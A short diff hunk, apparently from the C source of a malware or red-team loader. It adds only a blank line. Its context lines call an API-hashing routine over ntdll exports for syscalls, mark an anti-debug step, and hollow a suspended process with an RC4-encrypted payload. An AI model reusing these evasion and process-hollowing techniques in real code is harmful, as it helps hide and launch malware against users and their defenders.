@@ -743,6 +743,7 @@ int main() {
     GetAPIHashAddress(pNtdllBase, ppImageExportDirectory, &syscallsStruct.Query);
 
 
+
     //detectdebug
 
     hollowProcess(piSuspended, sizeof(Rc4CipherText));
